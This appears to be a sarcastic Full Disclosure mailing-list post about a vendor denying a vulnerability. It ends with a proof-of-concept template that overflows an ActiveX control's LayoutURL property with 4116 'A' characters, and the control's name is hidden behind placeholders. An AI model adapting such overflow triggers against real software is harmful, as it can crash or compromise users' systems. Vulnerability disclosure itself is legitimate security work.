Hello Full Disclosure, please forgive for me my premature mail. What is I
meant to now say is, I would like to warn you about Denial:

http://en.wikipedia.org/wiki/Denial

Denial is a defense mechanism postulated by Sigmund Freud, in which a person
is faced with a fact that is too uncomfortable to accept and rejects it
instead, insisting that it is not true despite what may be overwhelming
evidence.

I once had denial from vulnerable company I will release in the future:

targetFile = "C:\NOFREEBUGNAMES.ocx"
prototype  = "Invoke_Unknown LayoutURL As String"
memberName = "LayoutURL"
progid     = "no.free.bugs"
argCount   = 1

arg1=String(4116, "A")

target.LayoutURL = arg1
